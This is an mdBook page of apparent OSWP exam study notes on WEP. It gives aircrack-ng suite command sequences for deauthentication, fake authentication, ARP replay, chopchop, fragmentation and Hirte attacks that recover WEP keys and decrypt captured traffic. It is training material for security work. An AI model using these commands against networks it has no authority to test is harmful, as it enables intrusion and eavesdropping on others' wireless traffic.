@@ -1,0 +1,407 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Chapter 5 - WEP - Brandon&#x27;s OSWP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html" class="active"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li class="chapter-item expanded "><a href="WPAEnterprise.html"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">12.</strong> Chapter 10 - Links</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSWP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="chapter-5---wep"><a class="header" href="#chapter-5---wep">Chapter 5 - WEP</a></h1>
+<h2 id="quick-notes"><a class="header" href="#quick-notes">Quick Notes</a></h2>
+<pre><code>
+## Fake Authentication Attack
+   
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   macchanger --show &lt;interface&gt;                                                    ## learning the MAC address of the mon0 (monitor mode) network interface
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   
+   
+## Deauthentication Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                         ## performing a deauthentication attack against AP
+
+
+## ARP Request Replay Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                             ## performing a ARP Request Replay attack against AP
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                         ## performing a deauthentication attack against AP
+   aircrack-ng &lt;capture_file&gt;                                                       ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+ 
+
+## Interactive Packet Replay Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -2 -b &lt;AP_MAC&gt; -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 &lt;interface&gt;     ## performing a interactive packet replay attack against AP
+   aircrack-ng -z &lt;capture_file&gt;                                                    ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+
+
+## Fragmentation Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -5 -b &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;                             ## performing a fragmentation attack against AP
+   packetforge-ng -0 -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; -l &lt;Source_IP&gt; -k &lt;Dest_IP&gt; -y &lt;XOR_file&gt; -w &lt;output_file&gt;     ## creating an ARP request packet using packetforge-ng
+   tcpdump -n -vvv -e -s0 -r &lt;output_file&gt;                                          ## check the contents of the created package
+   aireplay-ng -2 -r &lt;output_file&gt; &lt;interface&gt;                                      ## injecting the generated packet into the network (If the correct pack is injected, the IV amount will increase rapidly.)
+   aircrack-ng &lt;capture_file&gt;                                                       ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+   
+
+## Korek ChopChop Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -4 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                             ## performing a korek chopchop attack against AP
+   packetforge-ng -0 -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; -l &lt;Source_IP&gt; -k &lt;Dest_IP&gt; -y &lt;XOR_file&gt; -w &lt;output_file&gt;     ## creating an ARP request packet using packetforge-ng
+   tcpdump -n -vvv -e -s0 -r &lt;output_file&gt;                                          ## check the contents of the created package
+   aireplay-ng -2 -r &lt;output_file&gt; &lt;interface&gt;                                      ## injecting the generated packet into the network (If the correct pack is injected, the IV amount will increase rapidly.)
+   aircrack-ng &lt;capture_file&gt;                                                       ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+
+
+## Bypassing WEP Shared Key Authentication
+   
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                                  ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;                ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                                  ## performing a deauthentication attack against AP to capture the PRGA XOR keystream
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -y &lt;keystream file&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;     ## performing a fake shared key authentication using XOR key flow
+   aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                                      ## performing a ARP Request Replay attack against AP
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                                  ## performing a deauthentication attack against AP
+   aircrack-ng &lt;capture_file&gt;                                                                ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+   
+   
+   
+   
+
+</code></pre>
+<p><img src="WEPDiagram.png" alt="WEPDiagram" /></p>
+<p>CRC-32 is a digest, just like MD5</p>
+<p>An attacker can sniff packets, where the IV (24 bit) is in plain text. since 24 bit is not much, capturing enough packets, statistical attacks can be run. RC4 generates the same keystring for a same IV+key. #Data in airodump shows how many useful packets have been captured. When enough are present we can crack it with:
+<code>aircrack-ng archivo.cap</code></p>
+<p>Sometimes aircrack doesn't return the ascii version of the key but we can connect to the network with the hex (without the ":" ).</p>
+<p>If not many clients are connected we can force the AP to send us traffic. We first need to associate with it (otherwise it ignores our requests), then we can send packets and capture the IVs in the packets it returns to us.</p>
+<p>For this, keep saving packets:
+<code>sudo airodump-ng --bssid &lt;bssid&gt; --channel &lt;channel&gt; --write out wlan0mon</code></p>
+<p>and do a fake auth (the 0 indicates that the attack is done once):
+<code>sudo aireplay-ng --fakeauth 0 -a &lt;AP bssid&gt; -h &lt;la MAC de wlan0mon&gt; wlan0mon</code></p>
+<p>In monitor mode, with ifconfig we see <code>unspec</code> instead of  <code>ether</code> and the MAC looks longer, we need only the first 6 bytes:
+<font color=red>and for aireplay commands replace - by : </font></p>
+<p>At this point we are only associated to the AP, not connected to it. There are several methods to generate traffic:</p>
+<h4 id="crafted-arp-packets"><a class="header" href="#crafted-arp-packets">Crafted ARP packets</a></h4>
+<p>Wait till there is an ARP packet (sent by the clients already connected to the network). They will be encrypted but because of their length we know they can be ARP. We just relay them to the AP. The AP will respond to us with another packet with a new IV. We do this until we have enough IVs.
+To do this (just befor this command run the --fakeauth just in case)
+It is necessary to use a target client MAC with -h, the MAC of a client that is already connected to the network and sends valid IVs
+<code>sudo aireplay-ng --arpreplay -b &lt;AP bssid&gt; -h &lt;target client MAC&gt; wlan0mon</code></p>
+<p><font color=red> The -a used in other commands is replaced by -b for the BSSID and the --arpreplay doesn't have any number afterward</font>
+This captures packets until one of them is an ARP request, and then starts to generate traffic. Watch with airodump who many useful packets we have in <code>#Data</code>.</p>
+<p><font color=red>to capture useful ARP packets we either need to be associated with the AP (fakeauth) or use with aireplay-ng arpreplay the MAC of an associated client</font></p>
+<p>Depending on the key length (64 or 128) bit it takes more IVs to crack the key</p>
+<h4 id="stealthy-sniffing"><a class="header" href="#stealthy-sniffing">Stealthy sniffing</a></h4>
+<p>Just waiting for clients to send a lot of IVs to the AP can take a lot of time but it's stealty</p>
+<h4 id="chop-chop-attack"><a class="header" href="#chop-chop-attack">Chop chop attack</a></h4>
+<p>Instead of replaying an ARP packet we determine the keystream of a packet, we craft a new packet with the keystream and inject it to the AP. The AP will respond with a new IV that we will replay, etc. Can be used when no clients are connected to the AP</p>
+<p><font color=red>The --fakeauth attack is only used against OPEN and WEP networks, it doesn't work against WPA/WPA2. Fake auth doesn't generate ARP packets. The lack of association with the access point is the biggest reason why injection fails, so we need to do fakeauth before trying to inject packets to WEP networks (ARP replay, chopchop, fragmentation attack).</font>
+Sometimes you periodically get disassociation events. Some access points require to reassociate every 30 seconds, otherwise the fake client is considered disconnected. In this case, setup the periodic re-association delay:</p>
+<pre><code class="language-bash">aireplay-ng -1 30 -e 'the ssid' -a 00:13:10:30:24:9C -h 00:11:22:33:44:55 ath0
+</code></pre>
+<p>If fake authentication is never successful (aireplay-ng keeps sending authentication requests) then MAC address filtering may be in place</p>
+<p>more info and troubleshooting in: https://www.aircrack-ng.org/doku.php?id=fake_authentication</p>
+<pre><code class="language-bash"># We first start airodump to capture packets and save them to a file
+sudo airodump-ng --bssid &lt;bssid&gt; --channel &lt;channel&gt; --write out wlan0mon
+
+# Then we do fake auth with aireplay to associate to the AP (run just before the chop chop attack). We can get our MAC with ifconfig wlan0
+sudo aireplay-ng --fakeauth 0 -a &lt;AP bssid&gt; -h &lt;our wlan0mon MAC that we want to associate&gt; wlan0mon
+
+# chop chop attack (waits for beacons from AP to try to determine keystream from them)
+sudo aireplay-ng --chopchop -b &lt;AP bssid&gt; -h &lt;our wlan0mon MAC&gt; wlan0mon
+
+# When it finds an ARP packet it asks if we want to use it. say "y". After a while it saves the keystream in a xor file. We can do ctrl-C to not wait much, but the saved keystream may fail. If so, keep the chop chop working for longer.
+
+# After that, forge an ARP packet (-0 option)
+packetforge-ng -0 -a &lt;bssid&gt; -h &lt;our wlan0mon MAC address&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;file.xor&gt; -w &lt;forged packet name&gt;
+# -k is destination IP (use 255.255.255.255)
+# -l is source IP (use 255.255.255.255)
+# &lt;forged packet name&gt; can be anything, it's the name of the forged packet
+
+# having done --deauth again, use the forged packet:
+sudo aireplay-ng -2 -r &lt;forged packet name&gt; wlan0mon
+# -2 is for replaying
+# it asks again if we want to use the packet. say "y", this starts to generate traffic that airodump caputres
+</code></pre>
+<h4 id="fragmentation-attack"><a class="header" href="#fragmentation-attack">fragmentation attack</a></h4>
+<p>Similar to chop chop but we need to obtain 1500 bytes from the pseudo random generator algorithm (PRGA). With this attack another packet is forged, but it's faster than chop chop, although we need to be physically close to the AP so that it works better.</p>
+<pre><code class="language-bash"># Start saving packets
+sudo airodump-ng --bssid &lt;bssid&gt; --channel &lt;channel&gt; --write out wlan0mon
+
+# fake auth (the 0 instructs to do the attack once)
+sudo aireplay-ng --fakeauth 0 -a &lt;AP bssid&gt; -h &lt;our wlan0mon MAC&gt; wlan0mon
+
+# Obtain PRGA
+aireplay-ng --fragment -b &lt;bssid&gt; -h &lt;our wlan0mon MAC&gt; wlan0mon
+
+# Say "y" when asked. It may fail several times and ask us if we want to use another. say "y" always. When one of the packets is useful it lets us know and saves the keystream in a .xor file
+
+# forge a new packet (with -0 it creates an ARP packet)
+packetforge-ng -0 -a &lt;bssid&gt; -h &lt;nuestra mac de wlan0mon&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;xor file&gt; -w &lt;output&gt;
+
+# inject the forged packet (remember to do fake auth just before this)
+sudo aireplay-ng -2 -r &lt;forged packet name&gt; wlan0mon
+</code></pre>
+<h4 id="wep-ska"><a class="header" href="#wep-ska">WEP SKA</a></h4>
+<p>Normally when we do fake auth with aireplay-ng to a WEP network we can see it becomes OPN, but some routers allow to configure Shared Key Authentication (SKA), which prevents that no one without that key can associate to the AP (unlike in OPEN networks, where anyone can associate). In networks with SKA set up we will see SKA after doing fake auth.</p>
+<p>It is possible to deauthenticate a connected client, and capture the SKA when he reconnects. With this key we can associate to the AP and try the previous attacks to recover the WEP key.</p>
+<p>We can also inject an ARP packet using the MAC address of the client which is already connected to the AP. With this we can generate traffic to recover IVs and still crack the WEP password, despite not having the SKA.</p>
+<pre><code class="language-bash">sudo aireplay-ng --arpreplay -b &lt;AP bssid&gt; -h &lt;MAC of a connected client&gt; wlan0mon
+</code></pre>
+<p>The 802.11w standard protects against deauth attacks, buth must be supported by both the client and the AP</p>
+<p>When we have cracked a WEP or WPA key we can decrypt captured traffic in wireshark:</p>
+<p><code>preferences &gt; protocols &gt; IEEE 802.11</code>, check "enable decryption", edit the decryption keys y create new entries. For WEP, use the key in hex format.`</p>
+<p>If we don't have wireshark we can do:</p>
+<pre><code class="language-bash">airdecap-ng -w &lt;wep key in hex&gt; &lt;pcap&gt;
+tshark -r &lt;decrypted pcap&gt;
+</code></pre>
+<h3 id="ap-less-attacks-caffe-latte-attack"><a class="header" href="#ap-less-attacks-caffe-latte-attack">AP-less attacks: Caffe latte attack</a></h3>
+<p>We can craft packets by modifying the ICV (integrity check value, that is, a CRC) and the plantext of a message and do so in a way that the AP thinks that the message is legitimate.</p>
+<p>With this we can modify a Gratuitous ARP packet and change it to an ARP request packet, to repeat the ARP attack</p>
+<p>Client devices store the keys of the networks they already connected to in the past. If we create a fake AP that looks like on of the stored APs in the client PNL, he will connect to us and send WEP-encrypted data with the target AP key. Sometimes it sends also Gratuitous ARP packets, to say its IP and MAC
+In these messages we won't find the target MAC, and the target IP and sender IP are the same (that of the client). We as an AP send requests to the client, and he will return responses to us, from where we get valid IVs that can be cracked as always.</p>
+<p>We don't have a valid WEP keys for the crafted packets, but due to the properties of XOR we can modify the packets that he sends us, and they will still be valid.</p>
+<h4 id="hirte-attack"><a class="header" href="#hirte-attack">Hirte attack</a></h4>
+<p>AP-less attack</p>
+<pre><code class="language-bash"># create fake AP (-N for hirte attack)
+airbase-ng -c 1 --essid "network1" -W 1 -N mon0
+
+# capture packets
+airodump-ng -c 1 mon0 --write Hirte
+
+# wait for the client to connect, and ARP packets should start being replayed, 
+</code></pre>
+<h3 id="wep-cloacking"><a class="header" href="#wep-cloacking">WEP cloacking</a></h3>
+<p>WEP protection in which fake packets are sent into the air to make it difficult to crack WEP (they try to difficult the statistical attacks)</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="Cracking.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="WPA.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="Cracking.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="WPA.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
